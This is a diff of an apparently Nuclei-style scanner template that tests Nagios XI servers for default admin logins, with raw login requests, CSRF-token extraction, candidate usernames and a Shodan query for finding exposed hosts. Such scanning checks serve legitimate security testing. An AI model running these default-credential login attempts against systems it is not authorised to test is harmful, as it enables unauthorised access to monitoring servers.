@@ -1,36 +1,34 @@
 id: nagiosxi-default-login
 
 info:
-  name: Nagios XI Default Admin Login - Detect
+  name: NagiosXI -  Default Login
   author: ritikchaddha
   severity: critical
-  description: Nagios XI default admin login credentials were detected.
+  description: NagiosXI default admin credentials were discovered.
   reference:
     - https://nagiosxi.demos.nagios.com/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
   classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
-    cvss-score: 9.8
-    cwe-id: CWE-1391
-    cpe: cpe:2.3:a:nagios:nagios_xi:*:*:*:*:*:*:*:*
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.1
+    cwe-id: CWE-522
   metadata:
-    verified: true
-    max-request: 6
+    verified: "true"
     shodan-query: title:"Nagios XI"
-    product: nagios_xi
-    vendor: nagios
   tags: nagios,nagiosxi,default-login
 
-http:
+requests:
   - raw:
       - |
         GET /nagiosxi/login.php HTTP/1.1
         Host: {{Hostname}}
+
       - |
         POST /nagiosxi/login.php HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
         nsp={{nsp}}&page=auth&debug=&pageopt=login&username={{username}}&password={{password}}&loginButton=
+
       - |
         GET /nagiosxi/index.php HTTP/1.1
         Host: {{Hostname}}
@@ -43,10 +41,11 @@ http:
         - nagiosadmin
         - nagiosxi
     attack: pitchfork
+
     stop-at-first-match: true
     host-redirects: true
     max-redirects: 2
-
+    cookie-reuse: true
     matchers-condition: and
     matchers:
       - type: word
@@ -68,4 +67,3 @@ http:
         regex:
           - 'name="nsp" value="(.*)">'
         internal: true
-# digest: 4a0a00473045022100ee9294259a3c0172e53c5ccc7ccfef490516a6183f9986e9c8f1edd17bed425c022011b3e837e8f70747b6359f190805922b1a53540f1d9d55378496d3f2447d2942:922c64590222798bb761d5b6d8e72950
